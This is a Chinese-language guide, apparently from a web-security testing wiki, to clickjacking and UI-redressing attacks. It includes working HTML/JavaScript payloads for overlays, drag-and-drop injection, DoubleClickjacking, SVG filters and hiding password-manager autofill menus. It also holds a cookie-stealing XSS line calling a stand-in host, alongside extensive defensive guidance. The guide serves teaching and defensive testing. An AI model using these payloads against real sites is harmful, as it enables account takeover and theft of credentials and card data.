---
attack_surface: [客户端利用]
impact: [身份伪造, 信息泄露, 完整性破坏]
risk_level: 高
prerequisites:
  - HTML/CSS 基础
  - 浏览器同源策略理解
  - iframe 与 postMessage 基础
related_techniques:
  - iframe-traps
  - xss-cross-site-scripting
  - csrf-cross-site-request-forgery
  - postmessage-vulnerabilities
  - browser-extension-attacks
  - oauth-attacks
difficulty: 初级
tools:
  - Burp Suite Clickbandit
  - postMessage-tracker (浏览器扩展)
  - 浏览器 DevTools Frame Tree
---

# Clickjacking — UI 覆盖攻击全指南

## TL;DR / 一句话总结

Clickjacking（点击劫持）通过在用户可见的 UI 之上叠加透明的 iframe，诱使用户在不知情的情况下点击目标网站上的按钮或链接。现代变体已经远超经典的透明 iframe 覆盖——DoubleClickjacking、SVG Filter UI 变形、DOM-based 扩展点击劫持等技术可以绕过几乎所有传统防护。

---

## 背景与原理

### 根因：浏览器无视觉完整性校验

浏览器的安全模型保护的是**数据边界**（同源策略），而不是**视觉边界**。当一个页面通过 iframe 嵌入另一个页面时：

- 同源策略阻止攻击者读取 iframe 内部 DOM
- 但**没有任何机制阻止攻击者控制用户在 iframe 内的点击坐标**
- 用户看到的是攻击者页面，点击的却是 iframe 内的目标按钮

**核心矛盾**：用户的眼睛由攻击者控制（CSS/HTML），用户的鼠标由浏览器路由到 iframe 内部——两者之间没有强制对齐的机制。

### 技术本质

```
[攻击者页面]
  ├── <div>看起来像普通按钮</div>       ← 用户看到这个
  └── <iframe src="victim.com"       ← 用户实际点击这里
           style="opacity:0.001;      ← 几乎完全透明
                  position:absolute;
                  top:xxx; left:xxx;"> ← 精确定位在"假按钮"上方
```

CSS 层叠上下文（stacking context）决定了点击事件的传递路径：
1. `z-index` 控制元素在 Z 轴上的顺序
2. 当 iframe 的 `z-index` 高于覆盖层，用户点击穿透覆盖层到达 iframe
3. `opacity` 让 iframe 对人眼不可见，但仍可接收点击事件（`opacity:0` 除外）

---

## 前提条件

| 条件 | 说明 |
|------|------|
| **目标页面可被 iframe 嵌入** | 未设置 `X-Frame-Options: DENY/SAMEORIGIN` 或 `frame-ancestors 'none'/'self'` |
| **目标存在可被滥用的点击行为** | 如删除账户、转账、授权 OAuth、提交表单、修改设置 |
| **攻击者能诱导用户访问攻击页面** | 钓鱼链接、恶意广告、被入侵的合法网站 |
| **(部分变体) JavaScript 启用** | 多数高级变体依赖 JS 进行坐标追踪、location 替换、DOM 操作 |
| **(部分变体) 目标页支持 GET 参数预填充表单** | Prepopulate forms trick 的前置条件 |

---

## 攻击分类

- **攻击面**：客户端利用（Client-Side Exploitation）
- **影响维度**：[x] 身份伪造 [x] 信息泄露 [x] 完整性破坏
- **风险等级**：**高** —— 无需认证即可利用，可导致账户接管、OAuth 授权劫持、敏感数据泄露

---

## 详细分析

### 1. 经典 Clickjacking — CSS Overlay

**技术机制**：使用 CSS 定位和透明度控制，在用户看到的"诱饵 UI"下方叠加一个透明的 iframe，使得用户点击诱饵时实际点击了 iframe 内的目标按钮。

#### Basic Payload

```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;        /* 几乎不可见，但不为 0（opacity:0 不可点击） */
       z-index: 2;          /* 在诱饵之上，截获点击 */
   }
   div {
       position:absolute;
       top:470px;           /* 精确定位"Click me"文字在目标按钮上方 */
       left:60px;
       z-index: 1;          /* 在 iframe 之下，用户先看到这个 */
   }
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=attacker@evil.com"></iframe>
```

**关键参数说明**：
- `opacity: 0.1` —— 不能设为 `0`（该值会使元素不可点击），最小值约为 `0.001`
- `z-index: 2` —— iframe 必须在诱饵之上，才能截获点击事件
- `position:absolute` —— 诱饵的精确像素定位，需要根据目标按钮位置手动调整
- URL 参数预填充 —— 通过 GET 参数将表单字段设置为攻击者控制的值

#### Multistep Payload

当目标操作需要两步以上点击时（如"确认删除"弹窗），需要对每一步进行分别对齐：

```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 500px;
       opacity: 0.1;
       z-index: 2;
   }
   .firstClick, .secondClick {
       position:absolute;
       top:330px;
       left:60px;
       z-index: 1;
   }
   .secondClick {
       left:210px;          /* 第二步点击位置不同 */
   }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```

**实战要点**：
- 需要先逆向目标的多步骤流程，记录每一步按钮的像素坐标
- 使用 DevTools 的 Element Picker + Computed Styles 精确测量
- 不同分辨率和缩放级别会影响坐标——需要测试或使用百分比定位

---

### 2. Prepopulate Forms Trick（表单预填充技巧）

**技术机制**：如果目标页面支持通过 GET 参数预填充表单字段（常见于搜索框、邮箱输入、注册表单等），攻击者可在 clickjacking URL 中预设恶意值，再诱使用户点击提交按钮。

**利用场景**：
- 邮箱修改：`/settings/email?new_email=attacker@evil.com`
- 搜索注入：`/search?q=<script>alert(1)</script>`
- 金额转账：`/transfer?amount=1000&to=attacker_account`

---

### 3. Drag & Drop + Click — 值注入

**技术机制**：利用 HTML5 Drag & Drop API，让用户将攻击者控制的文本拖拽到目标 iframe 内的输入框，从而填入攻击者控制的任意值。

```html
<html>
<head>
<style>
#payload{
  position: absolute;
  top: 20px;
}
iframe{
  width: 1000px;
  height: 675px;
  border: none;
}
.xss{
  position: fixed;
  background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts"
        style="opacity:0.3"
        src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true"
     ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')">
  <h3>2.DRAG ME TO THE RED BOX</h3>
</div>
</body>
</html>
```

**工作原理**：
1. 用户点击第一个红框（实际点击了 iframe 内的输入框，使其获得焦点）
2. 用户拖拽"DRAG ME TO THE RED BOX"到红框（`ondragstart` 设置拖拽数据为攻击者的值）
3. 用户点击第三个红框（实际点击了保存/提交按钮）

**关键**：iframe 需要 `sandbox="allow-forms allow-same-origin allow-scripts"` 以允许表单操作和拖放。

**真实案例**：[Clickjacking Account Takeover via Drag & Drop](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)

---

### 4. XSS + Clickjacking（联动攻击）

**攻击场景**：

```
[存在 Self-XSS 的表单页面]  +  [该页面可被 clickjack]  =  [将 Self-XSS 升级为 Stored XSS]
```

**具体流程**：
1. 发现一个 Self-XSS（只能攻击自己的 XSS，如个人资料页的"关于我"字段）
2. 该页面可被 iframe 嵌入，且支持 GET 参数预填充表单
3. 攻击者构造 clickjacking 页面，URL 中包含 XSS Payload：`/profile?about=<script>fetch('http://evil.co?'+document.cookie)</script>`
4. 诱使用户点击"保存"按钮
5. XSS Payload 被写入用户自己的个人资料，触发时窃取 Cookie / 执行操作

**为什么有价值**：单独的 Self-XSS 通常被认为无实际危害（无法攻击他人），但通过 Clickjacking 可以将它武器化为对任意用户的攻击。

---

### 5. DoubleClickjacking（双击劫持）

**技术机制**：利用 `mousedown` → `click` 事件之间的事件循环间隙，在用户第一次点击（`mousedown`）和第二次点击（`click`）之间**动态替换**窗口/iframe 的 location，使得第二次点击落到目标页面的真实按钮上。

**与经典 Clickjacking 的关键区别**：

| 维度 | 经典 Clickjacking | DoubleClickjacking |
|------|-------------------|-------------------|
| 透明 iframe | 需要 | **不需要** |
| X-Frame-Options 防护 | 有效阻止 | **完全绕过** |
| frame-ancestors CSP | 有效阻止 | **完全绕过** |
| 用户交互 | 单击 | 双击 |
| 依赖 | CSS 定位 | 事件时序 |

**攻击流程**：
1. 攻击页面显示一个普通按钮
2. 用户双击该按钮
3. 第一次 mousedown → 触发 `onclick` handler → `window.open(target_page)` —— 目标页面在用户鼠标下方打开
4. 第二次 click → 落在新打开的目标页面的真实按钮上

**OAuth 劫持示例**：
```
1. 用户访问攻击页面，看到"观看视频"按钮
2. 双击 → 第一次点击触发 window.open(OAuth 授权页面)
3. OAuth 授权页面在用户鼠标下方弹出
4. 第二次点击恰好落在"授权"按钮上
5. 攻击者获得 OAuth token
```

**关键**：这种攻击只需要目标存在**单个按钮的敏感操作**（如 OAuth 授权确认、一次性密码确认、支付确认），即可完成攻击。

#### Popup-based DoubleClickjacking（无 iframe 变体）

**技术机制**：放弃 iframe，使用 `window.open()` 创建的 popup 窗口作为点击目标。通过 `mousemove` 追踪用户鼠标位置，用 `moveTo()` 将 popup 精确定位在鼠标下方。

```javascript
<script>
let w;
onclick = () => {
  if (!w) w = window.open('/shim', 'pj', 'width=360,height=240');
  onmousemove = e => { try { w.moveTo(e.screenX, e.screenY); } catch {} };
  // 准备就绪后，将已加载的 popup 提到前台
  window.open('', 'pj');
};
</script>
```

**技术要点**：
- 由于跨域时 `moveTo()` 被浏览器阻止，popup 需要短暂导航到攻击者 origin 进行重定位
- 然后 `location` / `history.back()` 返回到目标页面
- 使用相同 `window.name` 重新 `window.open('', 'pj')` 将 popup 提到前台而不改 URL

**参考**：[DoubleClickjacking PoC Details (evil.blog)](https://www.evil.blog/2024/12/doubleclickjacking-what.html)

---

### 6. SVG Filters / Cross-Origin Iframe UI Redressing（SVG 滤镜 UI 变形）

**技术机制**：现代浏览器（Chromium / WebKit / Gecko）允许 CSS `filter:url(#id)` 应用于跨域 iframe。iframe 的光栅化像素作为 `SourceGraphic` 暴露给 SVG 滤镜图，攻击者可以使用 `feDisplacementMap`、`feBlend`、`feComposite`、`feColorMatrix`、`feTile`、`feMorphology` 等原语**任意变形用户看到的目标页面 UI**——无法通过 DOM 检测，因为攻击者从未触碰 iframe 的 DOM。

```html
<iframe src="https://victim.example"
        style="filter:url(#displacementFilter4)"></iframe>
```

#### 6.1 可用滤镜原语及用途

| 原语 | 功能 | 攻击用途 |
|------|------|---------|
| `feDisplacementMap` | 折射/变形文本 | 扭曲机密信息使其看起来像验证码 |
| `feComposite operator="arithmetic"` | 逐通道数学运算 `r = k1*i1*i2 + k2*i1 + k3*i2 + k4` | 对比度增强、遮罩、AND/OR 逻辑运算 |
| `feImage` | 加载攻击者位图 | 覆盖层、位移图 |
| `feFlood` | 创建纯色遮罩 | 构建常色 matte |
| `feColorMatrix` | 颜色矩阵变换 | 将亮度转为 alpha 通道，构建精确遮罩 |
| `feTile` | 裁剪和复制像素 | 像素探针放大到全屏、布尔遮罩 |
| `feMorphology` | 扩张/收缩描边 | 增厚文字笔画 |
| `feOffset / feGaussianBlur` | 偏移/模糊 | 柔化高光、边缘处理 |

#### 6.2 将机密信息扭曲为"验证码"

如果可被 iframe 嵌入的页面渲染了机密信息（token、重置码、API 密钥），攻击者可以将其变形为"验证码"的样子，诱使用户手动转录：

```html
<svg width="0" height="0">
  <filter id="captchaFilter">
    <feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
    <feDisplacementMap in="SourceGraphic" in2="noise" scale="6"
                       xChannelSelector="R" yChannelSelector="G" />
  </filter>
</svg>
<iframe src="https://victim.com/reset-token"
        style="filter:url(#captchaFilter)"></iframe>
<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
<!-- pattern 正则确保用户"解答验证码"时输入的真实值是攻击者需要的机密 -->
```

#### 6.3 像素探针（Pixel Probes）

攻击者可以通过裁剪 2-4px 区域并用 `feTile` 放大到全视口，将采样颜色转换为全屏纹理，并阈值化为布尔遮罩：

```html
<filter id="pixelProbe">
  <feTile x="313" y="141" width="4" height="4" />
  <feTile x="0" y="0" width="100%" height="100%" result="probe" />
  <feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
  <feColorMatrix type="matrix"
    values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
  <feGaussianBlur in="SourceGraphic" stdDeviation="2" />
  <feComposite operator="in" in2="mask" />
  <feBlend in2="SourceGraphic" />
</filter>
```

**逻辑门实现**：通过组合不同的 `feComposite` 通道数学运算（k1..k4 参数），可以在滤镜图中实现 AND/OR/XOR/NOT 逻辑门——使得滤镜流水线**图灵完备**，无需 JavaScript 即可读取 UI 状态。

**一个实际的 UI 状态读取示例** — 检测弹窗工作流中的多个布尔状态：

- **D**（dialog 可见）：探测变暗区域并对比白色
- **L**（dialog 已加载）：探测按钮坐标区域
- **C**（checkbox 已选中）：将 checkbox 像素与激活蓝色 `#0B57D0` 比较
- **R**（红色成功/失败横幅）：在横幅矩形内使用 `feMorphology` 和红色阈值

每种检测到的状态控制通过 `feImage` 嵌入的不同覆盖位图，使得覆盖层与实际弹窗同步，全程不触碰 DOM。

#### 6.4 输入框重定向（Recontextualizing Victim Inputs）

滤镜可以手术式地删除占位符/验证文字，只保留用户输入：

1. `feComposite arithmetic k2≈4` 放大亮度使灰色辅助文字饱和为白色
2. `feTile` 将工作区域限制在输入框矩形
3. `feMorphology operator="erode"` 增厚用户输入的暗色字形，保存为 `thick`
4. `feFlood` 创建白色板，`feBlend mode="difference"` 与 `thick`，再次 `feComposite k2≈100` 转为 stark luma matte
5. `feColorMatrix` 将亮度转为 alpha，`feComposite in="SourceGraphic" operator="in"` 仅保留用户输入的字形
6. 再次 `feBlend in2="white"` + 裁剪得到干净的文本框，攻击者覆盖自己的 HTML 标签

**结果**：用户看到的是攻击者的 HTML 标注（如"请输入你的邮箱"），但输入实际进入了被隐藏的 iframe 目标域的真实输入框。

---

### 7. Sandboxed Iframe Basic Auth Dialog

**技术机制**：一个没有 `allow-popups` 权限的 sandboxed iframe 仍然能触发**浏览器控制的 HTTP Basic Authentication 模态对话框**（由网络/认证层生成，非 JS `alert/prompt/confirm`），因此 sandbox 的弹窗限制无法阻止该对话框。

```html
<iframe id="basic" sandbox="allow-scripts"></iframe>
<script>
  basic.src = "https://httpbin.org/basic-auth/user/pass"
</script>
```

当目标端点返回 `401` + `WWW-Authenticate` 时，浏览器弹出凭据输入对话框。即使 iframe 标记为 sandbox，用户看到来自可信域的"浏览器原生"认证弹窗，容易输入凭据。

**攻击场景**：iframe 内嵌入可信域的端点触发 Basic Auth → 用户误以为浏览器要求认证 → 输入凭据（或密码管理器自动填充）→ 凭据被发送到攻击者指定的端点。

**Chrome 响应**：[Chromestatus: Restrict sandboxed frame dialogs](https://chromestatus.com/feature/4747009953103872)

---

### 8. 浏览器扩展 Clickjacking

#### 8.1 经典 `web_accessible_resources` 滥用

**技术机制**：浏览器扩展的 `manifest.json` 中声明的 `web_accessible_resources` 可以通过 `chrome-extension://[PACKAGE ID]/[PATH]` URL 从任意网页访问。这些资源**继承扩展的权限和上下文**。

```json
"web_accessible_resources": [
  "skin/*",       // ← 危险！扩展 UI 页面暴露给任意网页
  "icons/*"
]
```

攻击者只需将扩展的 `chrome-extension://` URL 嵌入 iframe，配合透明覆盖诱使用户点击其中的按钮。

#### 8.2 PrivacyBadger 案例

PrivacyBadger 将 `skin/popup.html` 暴露为 web 可访问资源。该页面包含"Disable PrivacyBadger for this Website"按钮。

```html
<style>
  iframe {
    width: 430px; height: 300px;
    opacity: 0.01;
    position: absolute;
  }
  button {
    position: absolute;
    top: 168px; left: 100px;
  }
</style>
<div id="stuff">
  <h1>Click the button</h1>
  <button id="button">click me</button>
</div>
<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html"></iframe>
```

**修复**：从 `web_accessible_resources` 中移除 `/skin/*`。

#### 8.3 Metamask 案例

MetaMask 的 `phishing.html` 页面被声明为 web 可访问资源。用户看到钓鱼警告页面时被诱骗"点击加入白名单"——实际点击了信任该钓鱼站点的按钮。修复方案：检查访问协议必须是 `https:` 或 `http:`（非 `chrome-extension://`）。

**参考**：[Metamask Clickjacking Vulnerability Analysis (SlowMist)](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

---

### 9. DOM-based Extension Clickjacking（密码管理器自动填充 UI）

**技术机制**：与经典扩展 clickjacking 不同，此类攻击不依赖 `web_accessible_resources` 的错误配置。它针对密码管理器**注入到页面 DOM 中的自动填充下拉菜单**，使用 CSS/DOM 技巧隐藏或遮挡这些 UI 元素，同时保持其可点击性。

#### 威胁模型

- 攻击者控制网页（或通过 XSS/子域接管/缓存投毒控制合法站点的一部分）
- 受害者安装了密码管理器扩展并已解锁（部分管理器在"锁定"状态下仍可自动填充）
- 至少需要诱导用户进行一次点击（通过覆盖的 cookie 横幅、弹窗、CAPTCHA、游戏等）

#### 攻击流程

```
1. 注入不可见但可聚焦的表单（login / PII / 信用卡字段）
2. 聚焦输入框 → 触发扩展的自动填充下拉菜单
3. 隐藏/遮挡扩展 UI 但保持其可交互性
4. 在隐藏的下拉菜单下方对齐诱饵控件 → 诱导用户点击选择条目
5. 从攻击者表单读取已填充的值 → 外传
```

#### 隐藏自动填充 UI 的技术

**方法 1 — 扩展根元素透明度**：
```javascript
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```

**方法 2 — Shadow DOM 内部子元素**：
```javascript
const root = Array.from(document.querySelectorAll('*'))
  .find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
  const frame = root.shadowRoot.querySelector('iframe')
  if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```

**方法 3 — 整页透明度 + 截图背景**：
```javascript
document.body.style.opacity = 0
document.documentElement.style.backgroundImage = 'url(screenshot.png)'

// 创建表单并聚焦触发下拉菜单
document.getElementById('cardnumber').focus()
document.body.style.opacity = '0.001'  // 保持可交互但不被察觉

function getCardValues() {
  const num = document.getElementById('cardnumber').value
  const exp = document.getElementById('expiry').value
  const cvc = document.getElementById('cvc').value
  // 通过 XHR/fetch/websocket 外传
}
```

**方法 4 — 全屏覆盖 `pointer-events:none`**：
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
  overlay.showPopover()
  document.getElementById('name').focus()  // 触发自动填充
  function getData(){ /* 读取并外传填充值 */ }
</script>
```

#### 鼠标跟随定位

```javascript
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
  personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
  setTimeout(() => f.focus(), 100)  // 定期重聚焦以防止下拉菜单消失
})
```

#### 影响范围

- **攻击者站点**：一次诱骗点击可窃取信用卡数据（卡号/有效期/CVC）和个人信息（姓名/邮箱/电话/地址/出生日期）——这些数据通常不受域名范围限制
- **有 XSS/子域接管/缓存投毒的受信站点**：多次点击可窃取凭据（用户名/密码）和 TOTP——因为密码管理器通常在同一父域的子域之间自动填充
- **Passkeys**：如果 RP 未将 WebAuthn 挑战绑定到会话，XSS 可拦截签名断言；DOM-based clickjacking 隐藏 passkey 提示以获取用户的确认点击

**参考**：[DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

---

## 攻击链与联动

### 链 1：Self-XSS → Clickjacking → Account Takeover

```
[Self-XSS Payload] → GET 参数预填充表单 → Clickjacking 诱骗提交 → XSS 执行 → Cookie 窃取 → 账户接管
```

### 链 2：DoubleClickjacking → OAuth Token 窃取

```
[用户双击] → mousedown: window.open(OAuth授权) → click: 点击"授权" → 攻击者获得 OAuth token → 账户接管
```
绕过：X-Frame-Options、frame-ancestors CSP、SameSite Cookies

### 链 3：XSS + Extension Clickjacking → 持久化浏览器扩展入侵

```
[浏览器扩展 XSS] → 修改扩展状态 → Clickjacking 诱骗用户点击 → 持久化恶意行为
```
案例：Steam Inventory Helper (browext-xss-example.md)

### 链 4：Iframe Trap + Clickjacking → 持久化钓鱼

```
[XSS 注入 iframe trap] → 用户被困在全屏 iframe → Clickjacking 劫持后续所有导航 → 持续窃取表单数据和导航历史
```
参考：`iframe-traps.md`

### 链 5：DOM-based Extension Clickjacking → 信用卡数据窃取

```
[诱饵页面] → 聚焦隐藏表单 → 触发密码管理器 → 隐藏自动填充 UI → 用户点击→ 卡片数据填充到攻击者表单 → 外传
```

### 攻击链总览

```
[入口点]          →  [初始访问]         →  [信息收集]        →  [目标达成]
XSS/CSRF             透明 iframe            表单数据/导航历史    账户接管
恶意广告              Drag & Drop           密码管理器填充        OAuth 劫持
钓鱼链接              DoubleClick           信用卡数据           资金转账
被入侵子域            SVG Filter            浏览器扩展状态       权限篡改
```

---

## 检测与防御

### 服务端防御（推荐）

#### 第一道防线：X-Frame-Options

```http
# 最严格：禁止任何来源的 iframe 嵌入
X-Frame-Options: DENY

# 同源允许：仅同源页面可嵌入
X-Frame-Options: SAMEORIGIN

# 指定允许域（部分浏览器不支持，不推荐单独使用）
X-Frame-Options: ALLOW-FROM https://trusted.com
```

#### 第二道防线：CSP frame-ancestors（推荐优先使用）

```http
# 禁止所有嵌入（等效 X-Frame-Options: DENY）
Content-Security-Policy: frame-ancestors 'none'

# 仅允许同源（等效 X-Frame-Options: SAMEORIGIN）
Content-Security-Policy: frame-ancestors 'self'

# 指定受信域
Content-Security-Policy: frame-ancestors trusted.com

# 允许多个源
Content-Security-Policy: frame-ancestors 'self' https://trusted.com
```

**`frame-ancestors` 优于 `X-Frame-Options` 的理由**：
- 支持多域名（X-Frame-Options 的 `ALLOW-FROM` 仅支持单个 URI）
- 浏览器统一支持，无兼容性问题
- 同时防御嵌套 iframe 和 frame/object/embed/applet
- 建议**两者同时设置**以覆盖旧版浏览器

#### 第三道防线：frame-src / child-src CSP

```http
# frame-src 定义允许的帧源
Content-Security-Policy: frame-src 'self' https://trusted-website.com

# child-src (CSP Level 2, 逐步被 frame-src + worker-src 取代)
Content-Security-Policy: child-src 'self' https://trusted-website.com
```

**回退行为**：
- 若 `frame-src` 缺失，使用 `child-src`
- 若两者都缺失，使用 `default-src`
- `child-src` 正在被废弃，推荐使用 `frame-src` + `worker-src` 替代

#### 第四道防线：SameSite Cookies

```http
Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly
```

`SameSite=Strict` / `SameSite=Lax` 可以防止 iframe 中的跨站请求携带 Cookie，从而阻止需要认证的操作被执行。

#### 第五道防线：Anti-CSRF Tokens

对于状态变更操作（表单提交、设置修改、资金转账），使用 Anti-CSRF Token 确保请求是用户有意发起的，而非通过 clickjacking 的 iframe 触发。

### 客户端防御（辅助，不完全可靠）

#### JavaScript Frame-Busting

```javascript
// 基础版
if (top !== self) {
  top.location = self.location
}

// 增强版（仍可能被 sandbox 属性绕过）
if (self !== top) {
  try {
    if (top.location.hostname !== self.location.hostname) {
      top.location = self.location
    }
  } catch (e) {
    top.location = self.location
  }
}
```

**警告**：frame-busting 容易被以下方式绕过：
- iframe `sandbox` 属性（`allow-forms allow-scripts` 但不含 `allow-top-navigation`）
- 浏览器禁用 JavaScript
- `beforeunload` 事件拦截

### 浏览器扩展开发者防御

| 策略 | 说明 |
|------|------|
| `X-Frame-Options: DENY` | 扩展 UI 页面应设置此头 |
| `frame-ancestors 'none'` | CSP 等效 |
| 检查访问协议 | 确保非 `chrome-extension://` / `moz-extension://` 访问 |
| 最小化 `web_accessible_resources` | 不要暴露 HTML UI 页面，使用 `matches` 精确匹配域名 |
| Closed Shadow DOM | 使 UI 元素更难受到 CSS 篡改 |
| Top Layer API（Popover） | 使用浏览器 Top Layer 渲染自动填充 UI，高于页面 z-index |
| 检测 hostile overlay | 使用 `elementsFromPoint()` 检测遮挡，列举其他 top-layer/popover 元素 |
| 监听样式篡改 | 使用 `MutationObserver` 检测 UI 根元素的异常样式变化 |
| 检测 body/html 透明度异常 | 预渲染和后渲染阶段检测 `opacity` 异常变化 |

### 防御效果矩阵

| 攻击类型 | X-Frame-Options | frame-ancestors | SameSite Cookies | Anti-CSRF Token |
|---------|:---:|:---:|:---:|:---:|
| 经典 Clickjacking | ✓ 阻止 | ✓ 阻止 | ✗ | △ |
| DoubleClickjacking | ✗ **绕过** | ✗ **绕过** | △ | △ |
| Popup DoubleClickjacking | ✗ **绕过** | ✗ **绕过** | △ | △ |
| SVG Filter UI Redressing | ✗ **绕过** | ✗ **绕过** | ✗ | ✗ |
| Extension Clickjacking (web_accessible) | N/A | N/A | ✗ | ✗ |
| DOM-based Extension Clickjacking | N/A | N/A | ✗ | ✗ |

> △ = 部分缓解（取决于具体实现）；N/A = 不适用（非服务端控制范围）

---

## 实战要点

### 测试方法

1. **检查目标页面是否可被 iframe 嵌入**：
   ```html
   <iframe src="https://target.com/sensitive-page" width="500" height="500"></iframe>
   ```
   若页面正常加载 → 存在 clickjacking 风险

2. **检查响应头**：
   ```bash
   curl -I https://target.com 2>/dev/null | grep -iE "x-frame-options|frame-ancestors"
   ```

3. **使用 Burp Suite Clickbandit**：Burp Suite Professional 内置 Clickjacking PoC 生成工具

4. **使用 postMessage-tracker 浏览器扩展**：监听 postMessage 通信，识别 wildcard targetOrigin

5. **DevTools Frame Tree**：使用 Chrome DevTools → Application → Frames 查看页面 iframe 嵌套结构

### 常见攻击目标

- OAuth 授权确认页面（"允许 XXX 访问你的账户？"）
- 支付确认页面（"确认支付 ¥XXX？"）
- 账户删除/注销确认按钮
- 权限/设置更改提交按钮
- 社交媒体"点赞"/"关注"按钮（Likejacking）
- 密码管理器自动填充下拉菜单
- 浏览器扩展 popup UI 页面

### 限制与注意事项

- `opacity: 0` 的元素不可点击——最小可用值约为 `0.001`
- iframe `sandbox` 属性若设置正确可直接阻止 clickjacking（但注意 `allow-popups` 不影响 Basic Auth dialog）
- DoubleClickjacking 需要用户双击——对移动端用户不适用
- SVG Filter 攻击依赖浏览器对 CSS `filter:url()` 在跨域 iframe 上的支持——Chrome 已开始限制
- 响应式设计使得坐标计算复杂化——需要测试多种分辨率或使用百分比/`vw`/`vh` 单位

---

## 参考资料

### 规范与文档
- [MDN: frame-ancestors CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)
- [W3C CSP: frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)
- [Chrome: web_accessible_resources](https://developer.chrome.com/extensions/manifest/web_accessible_resources)

### 攻击技术
- [PortSwigger: Web Security - Clickjacking](https://portswigger.net/web-security/clickjacking)
- [DoubleClickjacking — SecurityAffairs 首发文章](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html)
- [DoubleClickjacking PoC Details (evil.blog)](https://www.evil.blog/2024/12/doubleclickjacking-what.html)
- [SVG Filters — Clickjacking 2.0 (lyra.horse)](https://lyra.horse/blog/2025/12/svg-clickjacking/)
- [Iframe Sandbox Basic Auth Modal (phor3nsic)](https://phor3nsic.github.io/2026/01/21/trick-iframe-sandbox.html)
- [Clickjacking Account Takeover via Drag & Drop](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)

### 浏览器扩展
- [PrivacyBadger Clickjacking (Lizzie)](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [Metamask Clickjacking Analysis (SlowMist)](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [Dashlane Passkey Dialog Clickjacking Advisory](https://support.dashlane.com/hc/en-us/articles/28598967624722-Security-advisory-Passkey-Dialog-Clickjacking-Issue)

### 防御
- [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

### 演示视频
- [DoubleClickjacking Demo (YouTube)](https://www.youtube.com/watch?v=4rGvRRMrD18)
- [PrivacyBadger Clickjacking Demo (webm)](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm)

### Chrome 平台追踪
- [Chromestatus: Restrict sandboxed frame dialogs](https://chromestatus.com/feature/4747009953103872)
- [Chromium Issue: Sandboxed auth dialogs](https://issues.chromium.org/issues/40266321)

---

## 交叉引用

- [Iframe Traps / Click Isolation](../Iframe%20Traps/) — 全屏 iframe 持久化钓鱼与 Clickjacking 的联动（同为 HTTP Headers 分类）
- [XSS (Cross-Site Scripting)](../../Reflected%20Values/XSS/) — Self-XSS + Clickjacking 组合攻击
- [PostMessage Vulnerabilities](../../Forms-WebSockets-PostMsgs/PostMessage%20Vulnerabilities/) — postMessage wildcard + clickjacking 联动
- [CSRF](../../Forms-WebSockets-PostMsgs/CSRF/) — 同为跨站请求伪造，防御机制互补
- [OAuth 攻击](../../../External%20Identity%20Management/OAuth/) — DoubleClickjacking OAuth 授权劫持
- [Browser Extension Attacks](../../../Other%20Helpful%20Vulnerabilities/Browser%20Extension%20Attacks/) — 扩展 clickjacking 的上下文
- [Tapjacking (Mobile)](../../../Mobile/) — Android 移动端的等效攻击
